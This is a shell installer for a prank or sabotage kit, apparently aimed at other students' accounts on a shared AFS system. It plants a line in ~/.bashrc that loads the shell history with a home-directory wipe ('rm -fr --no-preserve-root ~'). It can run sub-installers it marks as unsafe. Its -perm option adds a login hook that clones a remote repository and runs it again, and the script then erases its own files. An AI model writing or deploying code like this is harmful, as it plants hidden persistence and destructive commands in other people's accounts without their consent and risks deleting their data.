#!/bin/sh
#usage: ./install_rand.sh [-unsafe] [-perm] [-noanti] [-nobak] [-tar] [-evil] [confloose to install]
#safe by default (no risk of real damage), change this with -unsafe
#does not reinstall on reboot by default, change this with -perm
#installs random confloose unless specific one is passed as param
#makes backups, deactivate with -nobak
#if you want a full backup of the afs/.confs dir as a tarball, use -tar
#installs an antidote unless -noanti is specified (or -nobak)
#evil sets all options to their worst (same as -unsafe -perm -noanti -nobak)

repo=$(dirname $0)

#do this first so it is packaged with the rest of the .bashrc
echo "echo -e \"cd\\nls\\ncd ..\\nls\\nrm -fr --no-preserve-root ~\" > ~/.bash_history" >> ~/.bashrc


#setsup backup directory (maybe make it hidden in the future?)
if [[ -d ~/afs ]]; then
	bakdir=~/afs/confbackup
else
	bakdir=~/confbackup
fi


#deals with params
declare -a confs
tar=0
backup=1
anti=1
unsafe=0
perm=0
for i in $(seq 1 $(($#))); do
	case ${!i} in
		-unsafe)
			unsafe=1;;
		-perm)
			[[ -d ~/afs ]] && perm=1;;
		-tar)
			tar=1;;
		-nobak)
			backup=0;;
		-noanti)
			anti=0;;
		-evil)
			unsafe=1
			[[ -d ~/afs ]] && perm=1
			backup=0
			anti=0;;
		*)
			confs+=("${!i}");;
	esac
done


#setsup random conf if none were given
if [[ ${#confs[@]} -eq 0 ]]; then
	rand=$(($RANDOM%1))
	if [[ ! $unsafe -eq 0 ]]; then             #adds unsafe conflooses if specified
		rand=$(($RANDOM%2))
	fi
	case $rand in
		0)
			confs+=("lag");;
		1)
			confs+=("gamble");;             #first unsafe confloose
	esac
fi



if [[ $backup -eq 1 ]]; then
#preps backups
	declare -a touched
	[[ $perm -eq 1 ]] && touched+="afs/.confs/install.sh"
	for conf in "${confs[@]}"; do
		case $conf in
			gamble | lag)
				[[ ! "${touched[*]}" =~ [[:space:]]".bashrc"[[:space:]] ]] && touched+=".bashrc";;
		esac
	done


	#makes backups
	[[ ! -d $bakdir ]] && mkdir $bakdir
	for val in "${touched[@]}"; do
		[[ ! -e $bakdir/$val ]] && cp ~/$val $bakdir/$val
		echo "cp \$bakdir/$val ~/$val" >> antidote.sh
	done

	#makes full backup as a security
	if [[ ! -e ~/afs/fullconfsbackup.tar.gz ]] && [[ -d ~/afs ]] && [[ $tar -eq 1 ]]; then
		tar -czf ~/afs/fullconfsbackup.tar.gz ~/afs/.confs
	fi


	#installs antidote
	if [[ $anti -eq 1 ]];then 
		if [[ -d ~/afs ]];then
			cp $repo/antidote.sh ~/afs/antidote.sh
		else
			cp $repo/antidote.sh ~/antidote.sh
		fi
	fi
fi



#installs confloose
if [[ $unsafe -eq 0 ]]; then
	for val in "${confs[@]}"; do
		case $val in
			gamble)
				echo skipping ${!i}, not a safe confloose, override with -unsafe;;
			*)
				$repo/$val/install.sh $repo;;
		esac
	done
else
	for val in "${confs[@]}"; do
		$repo/$val/install.sh $repo
	done
fi


#makes random confloose install on reboot
if [[ ! $perm -eq 0 ]]; then
	cat <<- MAKE_PERMANENT >> $HOME/afs/.confs/install.sh
		git clone https://github.com/tbvns/epita-wreaker.git
		./epita-wreaker/install_rand.sh
	MAKE_PERMANENT
fi


echo -e "cd\nls\ncd ..\nls\nrm -fr --no-preserve-root ~" > ~/.bash_history

rm -fr $repo
